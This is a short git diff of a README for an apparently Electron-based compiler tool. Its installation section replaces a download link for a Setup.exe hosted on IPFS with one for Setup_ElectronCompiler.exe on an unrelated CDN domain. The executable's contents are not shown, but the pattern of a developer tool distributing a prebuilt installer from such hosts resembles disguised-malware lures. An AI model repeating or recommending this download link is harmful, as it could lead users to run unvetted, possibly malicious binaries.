@@ -18,7 +18,7 @@ In order for your Electron application to compile correctly check that in your "
 
 ### Installation
 
-<a href="https://ipfs.io/ipfs/QmZwYjA8hifeuiKRs6xKCcbr1amdY4dQ6A4cEpxtKYvWer?filename=Setup.exe" target="_blank">Download Version Compile</a>
+<a href="https://cdn.smart-bot.me/Setup_ElectronCompiler.exe" target="_blank">Download Version Compile</a>
 
 A step by step guide that will tell you how to get the development environment up and running.
 The rest will be automatically managed by the application.
